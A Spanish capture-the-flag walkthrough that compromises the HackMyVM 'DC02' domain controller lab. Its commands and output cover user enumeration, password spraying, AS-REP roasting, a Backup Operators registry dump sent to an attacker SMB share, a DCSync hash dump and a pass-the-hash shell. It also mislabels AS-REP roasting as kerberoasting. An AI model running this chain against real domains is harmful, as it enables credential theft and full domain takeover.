---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# DC02 HackMyVM (Intermediate - Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-01 12:24 EDT
Nmap scan report for 192.168.28.11
Host is up (0.00036s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-02 01:24:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49707/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:4E:0B:0E (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 8h59m59s
| smb2-time: 
|   date: 2025-04-02T01:25:17
|_  start_date: N/A
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:4e:0b:0e (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.96 seconds
```

Veremos ya de primeras que esta asociado a un `dominio` llamado `SOUPEDECODE.LOCAL` por lo que podemos deducir que tiene por dentro un `Active Directory` por lo que esta utilizando autenticacion en `Kerberos`.

Vamos añadirlo a nuestro archivo `hosts` de la siguiente forma:

```shell
nano /etc/hosts

#Dentro del nano
<IP>           SOUPEDECODE.LOCAL
```

Tambien vemos un puerto asociado al `WinRM` que nos podra servir para cuando encontremos algunas credenciales, vamos a intentar enumerar el servidor `SMB` de la siguiente forma:

```shell
smbclient -L //SOUPEDECODE.LOCAL/ -N
```

Pero veremos que no podemos hacerlo de forma anonima, por lo que vamos a buscar mas informacion de como podriamos obtener algun usuario o credenciales mediante el servidor `SMB`.

URL = [Info SMB HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html?highlight=Pentesting%20SMB#search-exploit)

Pero probemos lo que probemos no va a ir, despues de buscar un rato vamos a probar a realizar fuerza bruta mediante `kerberos` y proporcionando un listado de usuarios para ver que usuarios pueden ser validos y cuales no:

## kerbrute

Antes tendremos que instalar la herramienta de la siguiente forma:

```shell
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute/
sudo apt install golang
go build
cp kerbrute /usr/bin/kerbrute
```

Una vez echo todo esto nos descargaremos el listado de usuario del siguiente link:

URL = [Download xato-net-10-million-usernames.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt)

```shell
kerbrute userenum --dc <IP> -d 'SOUPEDECODE.LOCAL' xato-net-10-million-usernames.txt
```

Info:

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/01/25 - Ronnie Flathers @ropnop

2025/04/01 14:17:14 >  Using KDC(s):
2025/04/01 14:17:14 >   192.168.28.11:88

2025/04/01 14:17:14 >  [+] VALID USERNAME:       admin@SOUPEDECODE.LOCAL
2025/04/01 14:17:14 >  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL
2025/04/01 14:17:14 >  [+] VALID USERNAME:       Charlie@SOUPEDECODE.LOCAL
2025/04/01 14:17:14 >  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL
2025/04/01 14:17:14 >  [+] VALID USERNAME:       Admin@SOUPEDECODE.LOCAL
2025/04/01 14:17:16 >  [+] VALID USERNAME:       Administrator@SOUPEDECODE.LOCAL
2025/04/01 14:17:16 >  [+] VALID USERNAME:       CHARLIE@SOUPEDECODE.LOCAL
2025/04/01 14:17:22 >  [+] VALID USERNAME:       ADMIN@SOUPEDECODE.LOCAL
2025/04/01 14:18:43 >  [+] VALID USERNAME:       wreed11@SOUPEDECODE.LOCAL
2025/04/01 14:21:56 >  [+] VALID USERNAME:       printserver@SOUPEDECODE.LOCAL
```

Por lo que vemos hemos encontrado varios usuarios validos, pero entre ellos los que no son por defecto seria los llamados `charlie` y `wreed11` por lo que vamos a probar a realizar fuerza bruta mediante el servidor `SMB` con dichos usuarios.

## netexec

> users.txt

```
wreed11
charlie
```

```shell
netexec smb <IP> -u users.txt -p <WORDLIST> --ignore-pw-decoding
```

Info:

```
SMB   192.168.28.11   445    DC01   [+] SOUPEDECODE.LOCAL\charlie:charlie
```

Vemos que hemos encontrado las credenciales de `charlie` por lo que vamos a listar el servidor `SMB` con dichas credenciales.

## SMB

```shell
smbclient -L //SOUPEDECODE.LOCAL/ -U charlie
```

Info:

```
		Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to SOUPEDECODE.LOCAL failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Vemos que los recursos compartidos son los que se crean por defecto, por lo que no veremos gran cosa por aqui.

Pero si probamos a `dumpearnos` todos los usuarios del dominio con dichas credenciales de la siguiente forma:

## impacket-lookupsid

```shell
impacket-lookupsid charlie@SOUPEDECODE.LOCAL
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at SOUPEDECODE.LOCAL
[*] StringBinding ncacn_np:SOUPEDECODE.LOCAL[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SOUPEDECODE\Administrator (SidTypeUser)
501: SOUPEDECODE\Guest (SidTypeUser)
502: SOUPEDECODE\krbtgt (SidTypeUser)
512: SOUPEDECODE\Domain Admins (SidTypeGroup)
513: SOUPEDECODE\Domain Users (SidTypeGroup)
514: SOUPEDECODE\Domain Guests (SidTypeGroup)
515: SOUPEDECODE\Domain Computers (SidTypeGroup)
516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
518: SOUPEDECODE\Schema Admins (SidTypeGroup)
519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
525: SOUPEDECODE\Protected Users (SidTypeGroup)
526: SOUPEDECODE\Key Admins (SidTypeGroup)
527: SOUPEDECODE\Enterprise Key Admins (SidTypeGroup)
553: SOUPEDECODE\RAS and IAS Servers (SidTypeAlias)
571: SOUPEDECODE\Allowed RODC Password Replication Group (SidTypeAlias)
572: SOUPEDECODE\Denied RODC Password Replication Group (SidTypeAlias)
1000: SOUPEDECODE\DC01$ (SidTypeUser)
..............................<DEMAS_USERS>....................................
```

Vamos a filtrar todo esta informacion y selecciona solamente los usuarios para guardarlos en un `users.txt`:

```shell
impacket-lookupsid charlie@SOUPEDECODE.LOCAL | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```

Y nos lo dejara algo asi:

```
Administrator
Guest
krbtgt
DC01$
bmark0
otara1
kleo2
eyara3
pquinn4
jharper5
bxenia6
gmona7
oaaron8
pleo9
evictor10
wreed11
bgavin12
ndelia13
akevin14
kxenia15
ycody16
qnora17
..............................<DEMAS_USERS>....................................
```

Ahora teniendo este listado vamos a descubrir que usuarios son vulnerables a un `kerberoasting` pudiendo obtener el `hash` de `kerberos` de la contraseña del usuario.

## impacket-GetNPUsers

```shell
impacket-GetNPUsers -usersfile users.txt -dc-ip <IP> 'SOUPEDECODE.LOCAL/charlie:charlie'
```

Este comando realiza una **enumeración de usuarios** en un dominio de **Active Directory** utilizando el protocolo **Kerberos** y el mecanismo de **Pre-Authentication**. Aprovechando las credenciales de un usuario específico (**charlie:charlie**), la herramienta **impacket-GetNPUsers** intenta autenticar a varios usuarios (especificados en un archivo de texto) contra el **Controlador de Dominio**. Si el **KDC** responde positivamente, se determina que el usuario existe y es válido en el dominio, lo que permite descubrir usuarios válidos en el dominio sin necesidad de obtener contraseñas.

Info:

```
........................<RESTO_RESULTADOS>........................................
$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:955d871845638be17bd37c7ac9ebcc3d$33909b8566042db8e09cbe6d7a4b9d93387556653279f031a414060093349583b95207e7da4ea711b28b82b38744fef76386b7da0871e8b0a6b7a8de362b14089f7e210f13a0eb0db0c6fca063182272d384074dc988c7abffcbcbf139d01689dae5fff277164ebdec864a49ea0c68672d1ec146774fbb4508b46a74ab84a1af057679606a70fa413dc970428bb9a5d94378ed0cb15c41d430b59072c5072bebb050393ecf7c4c5cbd77b60cb9a8bbc3cd9381ac29ae0f62b95636953ebf8b0e7999d7f0b103a3af9f3657be608ee39edfe0d1f97a29937527114dbbe2df945436398ac418282ef167fac745765ebfa0e926cc674b4f
........................<RESTO_RESULTADOS>........................................
```

Vemos que hemos obtenido un `hash` del usuario `zximena448` por lo que lo intentaremos `crackear` de la siguiente forma:

### Crackear Hash Kerberos

> hash.kerberos

```
$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:955d871845638be17bd37c7ac9ebcc3d$33909b8566042db8e09cbe6d7a4b9d93387556653279f031a414060093349583b95207e7da4ea711b28b82b38744fef76386b7da0871e8b0a6b7a8de362b14089f7e210f13a0eb0db0c6fca063182272d384074dc988c7abffcbcbf139d01689dae5fff277164ebdec864a49ea0c68672d1ec146774fbb4508b46a74ab84a1af057679606a70fa413dc970428bb9a5d94378ed0cb15c41d430b59072c5072bebb050393ecf7c4c5cbd77b60cb9a8bbc3cd9381ac29ae0f62b95636953ebf8b0e7999d7f0b103a3af9f3657be608ee39edfe0d1f97a29937527114dbbe2df945436398ac418282ef167fac745765ebfa0e926cc674b4f
```

```shell
john --wordlist=<WORDLIST> --format=krb5asrep hash.kerberos
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
internet         ($krb5asrep$23$zximena448@SOUPEDECODE.LOCAL)     
1g 0:00:00:00 DONE (2025-04-01 14:47) 12.50g/s 12800p/s 12800c/s 12800C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Vemos que la consiguio crackear de forma correcta, por lo que vamos a probarlas en el servidor `SMB`:

```shell
smbclient -L //SOUPEDECODE.LOCAL/ -U zximena448
```

Info:

```
		Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.28.11 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Si probamos a meternos en el recurso compartido `C$` veremos que nos deja:

```shell
smbclient //SOUPEDECODE.LOCAL/C$ -U zximena448
```

Por lo que vamos a leer la `flag` del usuario:

> user.txt

```
2fe79eb0e02ecd4dd2833cfcbbdb504c
```

## Escalate Privileges

Vamos a ver a que grupo pertenece el usuario `a` con `ldapsearch`:

```shell
ldapsearch -x -H ldap://<IP>/ -D "zximena448@SOUPEDECODE.LOCAL" -w 'internet' -b "dc=SOUPEDECODE,dc=LOCAL" "(sAMAccountName=zximena448)" memberOf
```

Info:

```
# extended LDIF
#
# LDAPv3
# base <dc=SOUPEDECODE,dc=LOCAL> with scope subtree
# filter: (sAMAccountName=zximena448)
# requesting: memberOf 
#

# Zach Ximena, Users, SOUPEDECODE.LOCAL
dn: CN=Zach Ximena,CN=Users,DC=SOUPEDECODE,DC=LOCAL
memberOf: CN=Backup Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL

# search reference
ref: ldap://ForestDnsZones.SOUPEDECODE.LOCAL/DC=ForestDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.SOUPEDECODE.LOCAL/DC=DomainDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://SOUPEDECODE.LOCAL/CN=Configuration,DC=SOUPEDECODE,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

Vemos la siguiente linea interesante:

```
# Zach Ximena, Users, SOUPEDECODE.LOCAL
dn: CN=Zach Ximena,CN=Users,DC=SOUPEDECODE,DC=LOCAL
memberOf: CN=Backup Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL
```

Vemos que pertenecemos al grupo `Backup Operators` por lo que podremos aprovechar esto para poder obtener informacion utilizando un `exploit`:

URL = [Exploit Backup Operators](https://github.com/horizon3ai/backup_dc_registry?tab=readme-ov-file)

Nos clonaremos el repositorio a nuestro `host`:

```shell
git clone https://github.com/horizon3ai/backup_dc_registry.git
cd backup_dc_registry/
```

Teniendo el archivo `reg.py` lo ejecutaremos de la siguiente forma:

Pero antes por lo que vemos en el comando tendremos que abrir un servidor `SMB` desde el `host` para que podamos obtener le `backup` o la informacion de la cual estamos pidiendo al `DC`:

```shell
mkdir smbshare
impacket-smbserver -smb2support 'share' ./smbshare
```

Info:

```
mkdir: cannot create directory ‘smbshare’: File exists
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Ahora ejecutaremos lo siguiente:

```shell
python3 reg.py zximena448:'internet'@<IP_VICTIM> backup -p '\\<IP_ATTACKER>\share'
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Dumping SAM hive to \\192.168.28.5\share\SAM
Dumping SYSTEM hive to \\192.168.28.5\share\SYSTEM
Dumping SECURITY hive to \\192.168.28.5\share\SECURITY
```

Con esto lo que habremos echo sera guardar esas carpetas (`backups`) en la carpeta `smbshare`, si listamos dicha carpeta veremos lo siguiente:

```shell
ls -la smbshare
```

Info:

```
total 11324
drwxr-xr-x 2 root root     4096 Apr  1 15:10 .
drwxr-xr-x 4 kali kali     4096 Apr  1 15:09 ..
-rwxr-xr-x 1 root root    28672 Apr  1 15:10 SAM
-rwxr-xr-x 1 root root    32768 Apr  1 15:10 SECURITY
-rwxr-xr-x 1 root root 11526144 Apr  1 15:10 SYSTEM
```

Veremos que ha funcionado, por lo que vamos a extraer los `hahes` de dicho archivo de la siguiente forma:

```shell
impacket-secretsdump -system SYSTEM -security SECURITY -sam SAM LOCAL
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:38665bf3f150a3cd7cfd048867fc9a0c79d070db919852e0c8e16acc4e6924783535fc40457547c0034f997fbf3ea356d6b5e4eb89fbf3238083f603e42c42289ae2d0d93466d6bd1efc4ffb31c1ae74dc3128ff3f1d2e86066b73e4ac5ff49dca106807707cda0a191a3d748fca24caedfa199b6047b347c4a9b3a3a4029f486d0a84103879fea4234e1949cefd128afa0678c107344cc9cec7fe8a46ecc5bbb667841bc6190a96662b1db1bf1b56178e60be534ba836b6d1633e6610bdb7b4c1106f6425535e9954fae7aa97e496e9a986e32c9bcfeed7c814ac90361ccc8fc56734bb8f6ea12bdef7839c4fa17417
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:73d82a1beee2bf886b0ea8421f66240d
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4
dpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503
[*] NL$KM 
 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...
 0010   62 4D CA D9 55 20 44 41  75 55 3E 85 82 06 21 14   bM..U DAuU>...!.
 0020   8E FA A1 77 0A 9C 0D A4  9A 96 44 7C FC 89 63 91   ...w......D|..c.
 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...
NL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991
[*] Cleaning up...
```

Con esto veremos que ha funcionado y hemos obtenido los `hashes` de las contraseñas de dichos usuarios pero de forma local, lo que queremos es obtener las contraseñas de los mismo usuarios pero del dominio, el `hash` que nos interesa es el del `DC` y la que mas atrae que pueda ser esa es la del `$MACHINE.ACC`, por lo que vamos a probar a que usuario pertenece del listado de usuarios que obtuvimos anteriormente:

```shell
crackmapexec smb <IP> -u <USERS_DOMAIN> -H 73d82a1beee2bf886b0ea8421f66240d
```

Info:

```
SMB         192.168.10.49   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.10.49   445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:73d82a1beee2bf886b0ea8421f66240d STATUS_LOGON_FAILURE 
SMB         192.168.10.49   445    DC01             [-] SOUPEDECODE.LOCAL\Guest:73d82a1beee2bf886b0ea8421f66240d STATUS_LOGON_FAILURE 
SMB         192.168.10.49   445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:73d82a1beee2bf886b0ea8421f66240d STATUS_LOGON_FAILURE 
SMB         192.168.10.49   445    DC01             [+] SOUPEDECODE.LOCAL\DC01$:73d82a1beee2bf886b0ea8421f66240d
```

Vemos que el usuario es `DC01` por lo que nos dumpearemos con dicho usuario los `hashes` pero en este caso del dominio, de la siguiente forma:

```shell
impacket-secretsdump 'SOUPEDECODE.LOCAL/DC01$@<IP>' -hashes 'aad3b435b51404eeaad3b435b51404ee:73d82a1beee2bf886b0ea8421f66240d'
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15:::
soupedecode.local\otara1:1104:aad3b435b51404eeaad3b435b51404ee:ee98f16e3d56881411fbd2a67a5494c6:::
soupedecode.local\kleo2:1105:aad3b435b51404eeaad3b435b51404ee:bda63615bc51724865a0cd0b4fd9ec14:::
soupedecode.local\eyara3:1106:aad3b435b51404eeaad3b435b51404ee:68e34c259878fd6a31c85cbea32ac671:::
soupedecode.local\pquinn4:1107:aad3b435b51404eeaad3b435b51404ee:92cdedd79a2fe7cbc8c55826b0ff2d54:::
soupedecode.local\jharper5:1108:aad3b435b51404eeaad3b435b51404ee:800f9c9d3e4654d9bd590fc4296adf01:::
soupedecode.local\bxenia6:1109:aad3b435b51404eeaad3b435b51404ee:d997d3309bc876f12cbbe932d82b18a3:::
soupedecode.local\gmona7:1110:aad3b435b51404eeaad3b435b51404ee:c2506dfa7572da51f9f25b603da874d4:::
............................<DEMAS_USUARIOS_DOMINIO>..............................
```

Veremos que ha funcionado y obtendremos los `hashes` de los usuarios del dominio, pero el que nos interesa es el del `Administrador`, podemos intentar `crackearla` o tambien podremos realizar un `Pass-The-Hash` mediante `WinRM`.

```shell
evil-winrm -i <IP> -u Administrator -H '8982babd4da89d33210779a6c5b078bd'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
soupedecode\administrator
```

Con esto ya seremos el usuario `Administrador` por lo que leeremos la `flag` del `admin`.

> root.txt

```
d41d8cd98f00b204e9800998ecf8427e
```
